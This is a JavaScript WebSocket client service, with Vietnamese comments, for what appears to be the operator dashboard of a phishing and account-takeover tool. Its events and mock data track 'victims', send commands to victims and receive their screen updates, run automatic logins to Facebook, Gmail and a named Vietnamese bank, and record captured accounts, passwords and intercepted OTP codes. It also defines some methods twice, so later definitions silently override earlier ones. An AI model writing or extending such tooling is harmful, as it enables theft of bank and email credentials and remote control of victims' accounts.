/**
 * WebSocket Service - Real-time Communication
 * Tích hợp WebSocket cho real-time features
 */

import { io } from "socket.io-client";
import toast from "react-hot-toast";

const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || "http://localhost:3000";
const USE_MOCK = import.meta.env.VITE_USE_MOCK === "1";
const WS_RECONNECT_ATTEMPTS =
  parseInt(import.meta.env.VITE_WS_RECONNECT_ATTEMPTS) || 5;
const WS_RECONNECT_DELAY =
  parseInt(import.meta.env.VITE_WS_RECONNECT_DELAY) || 3000;
const WS_HEARTBEAT_INTERVAL =
  parseInt(import.meta.env.VITE_WS_HEARTBEAT_INTERVAL) || 30000;

class WebSocketService {
  constructor() {
    this.socket = null;
    this.isConnected = false;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = WS_RECONNECT_ATTEMPTS;
    this.reconnectDelay = WS_RECONNECT_DELAY;
    this.heartbeatInterval = null;
    this.eventListeners = new Map();
    this.mockIntervals = new Map();
  }

  // Kết nối WebSocket
  connect() {
    if (USE_MOCK) {
      this.setupMockConnection();
      return Promise.resolve();
    }

    return new Promise((resolve, reject) => {
      try {
        this.socket = io(SOCKET_URL, {
          transports: ["websocket", "polling"],
          timeout: 10000,
          reconnection: true,
          reconnectionAttempts: this.maxReconnectAttempts,
          reconnectionDelay: this.reconnectDelay,
        });

        this.socket.on("connect", () => {
          console.log("WebSocket connected");
          this.isConnected = true;
          this.reconnectAttempts = 0;
          this.startHeartbeat();
          toast.success("Kết nối real-time thành công");
          resolve();
        });

        this.socket.on("disconnect", (reason) => {
          console.log("WebSocket disconnected:", reason);
          this.isConnected = false;
          this.stopHeartbeat();
          toast.error("Mất kết nối real-time");
        });

        this.socket.on("connect_error", (error) => {
          console.error("WebSocket connection error:", error);
          this.reconnectAttempts++;

          if (this.reconnectAttempts >= this.maxReconnectAttempts) {
            toast.error("Không thể kết nối real-time");
            reject(error);
          }
        });

        this.socket.on("reconnect", (attemptNumber) => {
          console.log("WebSocket reconnected after", attemptNumber, "attempts");
          toast.success("Đã kết nối lại real-time");
        });

        // Setup event handlers
        this.setupEventHandlers();
      } catch (error) {
        console.error("Failed to create WebSocket connection:", error);
        reject(error);
      }
    });
  }

  // Ngắt kết nối
  disconnect() {
    if (this.socket) {
      this.socket.disconnect();
      this.socket = null;
    }

    this.isConnected = false;
    this.stopHeartbeat();
    this.clearMockIntervals();
    this.eventListeners.clear();
  }

  // Thiết lập mock connection cho development
  setupMockConnection() {
    this.isConnected = true;
    console.log("Mock WebSocket connected");
    toast.success("Mock real-time connection active");

    // Simulate real-time events
    this.startMockEvents();
  }

  // Bắt đầu mock events
  startMockEvents() {
    // Auto login updates
    const autoLoginInterval = setInterval(() => {
      this.emit("autoLoginUpdate", {
        id: "AL001",
        status: "in_progress",
        progress: Math.min(Math.random() * 100, 95),
        lastActivity: new Date(),
      });
    }, 5000);

    // Victim status updates
    const victimInterval = setInterval(() => {
      // Generate mock data for different event types
      this.generateMockData("victimStatusUpdate");
    }, 8000);

    // System stats updates
    const systemInterval = setInterval(() => {
      this.generateMockSystemStats();
    }, 3000);

    // New intervention requests
    const interventionInterval = setInterval(() => {
      if (Math.random() > 0.85) {
        this.emit("interventionRequired", {
          id: `AL${Date.now()}`,
          type: Math.random() > 0.5 ? "otp_required" : "captcha_failed",
          victimId: "Target_User_001",
          website: "banking.example.com",
          timestamp: new Date(),
        });
      }
    }, 15000);

    this.mockIntervals.set("autoLogin", autoLoginInterval);
    this.mockIntervals.set("victim", victimInterval);
    this.mockIntervals.set("system", systemInterval);
    this.mockIntervals.set("intervention", interventionInterval);
  }

  // Xóa mock intervals
  clearMockIntervals() {
    this.mockIntervals.forEach((interval) => {
      clearInterval(interval);
    });
    this.mockIntervals.clear();
  }

  // Thiết lập event handlers
  setupEventHandlers() {
    if (!this.socket) return;

    // Auto login events
    this.socket.on("autoLoginUpdate", (data) => {
      this.emit("autoLoginUpdate", data);
    });

    this.socket.on("autoLoginCompleted", (data) => {
      this.emit("autoLoginCompleted", data);
      toast.success(`Auto login hoàn thành: ${data.website}`);
    });

    this.socket.on("interventionRequired", (data) => {
      this.emit("interventionRequired", data);
      toast.error(`Cần can thiệp: ${data.type}`, {
        duration: 10000,
      });
    });

    // Victim control events
    this.socket.on("victimStatusUpdate", (data) => {
      this.emit("victimStatusUpdate", data);
    });

    this.socket.on("victimCommandResult", (data) => {
      this.emit("victimCommandResult", data);
    });

    this.socket.on("victimScreenUpdate", (data) => {
      this.emit("victimScreenUpdate", data);
    });

    // System events
    this.socket.on("systemStatsUpdate", (data) => {
      this.emit("systemStatsUpdate", data);
    });

    this.socket.on("systemAlert", (data) => {
      this.emit("systemAlert", data);
      toast.error(`System Alert: ${data.message}`);
    });
  }

  // Bắt đầu heartbeat
  startHeartbeat() {
    this.heartbeatInterval = setInterval(() => {
      if (this.socket && this.isConnected) {
        this.socket.emit("ping");
      }
    }, WS_HEARTBEAT_INTERVAL);
  }

  // Dừng heartbeat
  stopHeartbeat() {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
      this.heartbeatInterval = null;
    }
  }

  // Gửi message
  send(event, data) {
    if (USE_MOCK) {
      console.log("Mock WebSocket send:", event, data);
      return;
    }

    if (this.socket && this.isConnected) {
      this.socket.emit(event, data);
    } else {
      console.warn("WebSocket not connected, cannot send:", event);
    }
  }

  // Đăng ký event listener
  on(event, callback) {
    if (!this.eventListeners.has(event)) {
      this.eventListeners.set(event, []);
    }
    this.eventListeners.get(event).push(callback);
  }

  // Hủy đăng ký event listener
  off(event, callback) {
    if (this.eventListeners.has(event)) {
      const listeners = this.eventListeners.get(event);
      const index = listeners.indexOf(callback);
      if (index > -1) {
        listeners.splice(index, 1);
      }
    }
  }

  // Emit event cho local listeners
  emit(event, data) {
    if (this.eventListeners.has(event)) {
      this.eventListeners.get(event).forEach((callback) => {
        try {
          callback(data);
        } catch (error) {
          console.error("Error in event listener:", error);
        }
      });
    }
  }

  // Auto Login specific methods
  subscribeToAutoLogin(callback) {
    this.on("autoLoginUpdate", callback);
    this.on("autoLoginCompleted", callback);
    this.on("interventionRequired", callback);
  }

  sendInterventionResponse(requestId, action, data) {
    this.send("interventionResponse", {
      requestId,
      action,
      data,
      timestamp: new Date(),
    });
  }

  // Victim Control specific methods
  subscribeToVictim(victimId, callback) {
    this.on("victimStatusUpdate", (data) => {
      if (data.id === victimId) {
        callback(data);
      }
    });

    this.on("victimCommandResult", (data) => {
      if (data.victimId === victimId) {
        callback(data);
      }
    });
  }

  sendVictimCommand(victimId, command, params = {}) {
    this.send("victimCommand", {
      victimId,
      command,
      params,
      timestamp: new Date(),
    });
  }

  // System monitoring methods
  subscribeToSystemStats(callback) {
    this.on("systemStatsUpdate", callback);
    this.on("systemAlert", callback);
  }

  // Kiểm tra trạng thái kết nối
  isSocketConnected() {
    return this.isConnected;
  }

  // Lấy thông tin kết nối
  getConnectionInfo() {
    return {
      connected: this.isConnected,
      url: SOCKET_URL,
      reconnectAttempts: this.reconnectAttempts,
      maxReconnectAttempts: this.maxReconnectAttempts,
      useMock: USE_MOCK,
    };
  }

  // Generate mock data for different event types
  generateMockData(eventType) {
    const timestamp = new Date().toISOString();

    switch (eventType) {
      default:
        return {
          timestamp,
          type: eventType,
          data: `Mock data for ${eventType}`,
        };
    }
  }

  generateMockAccessHistoryUpdate() {
    return {
      type: "new_entry",
      data: {
        id: Date.now(),
        timestamp: new Date().toLocaleString("vi-VN"),
        linkName: `Real-time Link #${Math.floor(Math.random() * 1000)}`,
        account: `realtime${Math.floor(
          Math.random() * 1000
        )}@example.com | 090${Math.floor(Math.random() * 10000000)} | Platform`,
        password: "realtime" + Math.floor(Math.random() * 1000),
        otpCode: Math.floor(Math.random() * 900000 + 100000).toString(),
        ipAddress: `192.168.1.${Math.floor(Math.random() * 255)}`,
        status: ["success", "pending", "failed"][Math.floor(Math.random() * 3)],
        chromeProfile: `realtime-profile-${Math.floor(Math.random() * 10)}`,
        isTest: false,
      },
    };
  }

  generateMockSystemStats() {
    return {
      timestamp: new Date().toISOString(),
      cpu: Math.floor(Math.random() * 100),
      memory: Math.floor(Math.random() * 100),
      disk: Math.floor(Math.random() * 100),
      activeUsers: Math.floor(Math.random() * 50),
      onlineVictims: Math.floor(Math.random() * 20),
      totalRequests: Math.floor(Math.random() * 1000),
      successRate: Math.floor(Math.random() * 40) + 60, // 60-100%
    };
  }

  generateMockAutoLoginProgress() {
    return {
      requestId: `AL${Math.floor(Math.random() * 1000)}`,
      progress: Math.floor(Math.random() * 100),
      status: ["waiting_otp", "processing", "completed", "failed"][
        Math.floor(Math.random() * 4)
      ],
      website: ["facebook.com", "gmail.com", "banking.vietcombank.com.vn"][
        Math.floor(Math.random() * 3)
      ],
      needsIntervention: Math.random() > 0.7,
      message: "Real-time auto login update",
    };
  }

  // Subscribe to real-time events
  subscribe(eventType, callback) {
    if (!this.eventListeners.has(eventType)) {
      this.eventListeners.set(eventType, []);
    }
    this.eventListeners.get(eventType).push(callback);

    if (USE_MOCK) {
      this.setupMockEvent(eventType);
    } else if (this.socket) {
      this.socket.on(eventType, callback);
    }
  }

  // Emit event to server
  emit(eventType, data) {
    if (USE_MOCK) {
      console.log(`Mock emit: ${eventType}`, data);
      return;
    }

    if (this.socket && this.isConnected) {
      this.socket.emit(eventType, data);
    } else {
      console.warn("WebSocket not connected, cannot emit:", eventType);
    }
  }

  // Request real-time access history updates
  subscribeToAccessHistory(callback) {
    this.subscribe("access_history_update", callback);
    this.subscribe("new_access_attempt", callback);
    this.subscribe("login_status_change", callback);
  }

  // Request real-time system monitoring
  subscribeToSystemMonitoring(callback) {
    this.subscribe("system_stats_update", callback);
    this.subscribe("victim_status_change", callback);
    this.subscribe("chrome_profile_update", callback);
  }

  // Request real-time auto login updates
  subscribeToAutoLogin(callback) {
    this.subscribe("auto_login_progress", callback);
    this.subscribe("auto_login_intervention_needed", callback);
    this.subscribe("auto_login_completed", callback);
  }

  // Setup mock events for development
  setupMockEvent(eventType) {
    if (this.mockIntervals.has(eventType)) return;

    let interval;

    switch (eventType) {
      case "access_history_update":
      case "new_access_attempt":
        interval = setInterval(() => {
          const callbacks = this.eventListeners.get(eventType) || [];
          const mockData = this.generateMockAccessHistoryUpdate();
          callbacks.forEach((callback) => callback(mockData));
        }, 8000);
        break;

      case "system_stats_update":
        interval = setInterval(() => {
          const callbacks = this.eventListeners.get(eventType) || [];
          const mockData = this.generateMockSystemStats();
          callbacks.forEach((callback) => callback(mockData));
        }, 10000);
        break;

      case "auto_login_progress":
        interval = setInterval(() => {
          const callbacks = this.eventListeners.get(eventType) || [];
          const mockData = this.generateMockAutoLoginProgress();
          callbacks.forEach((callback) => callback(mockData));
        }, 6000);
        break;

      default:
        interval = setInterval(() => {
          const callbacks = this.eventListeners.get(eventType) || [];
          const mockData = this.generateMockData(eventType);
          callbacks.forEach((callback) => callback(mockData));
        }, 5000);
    }

    this.mockIntervals.set(eventType, interval);
  }
}

// Singleton instance
const websocketService = new WebSocketService();

// Auto-connect when imported (if not in mock mode)
if (!USE_MOCK) {
  websocketService.connect().catch(console.error);
}

export default websocketService;
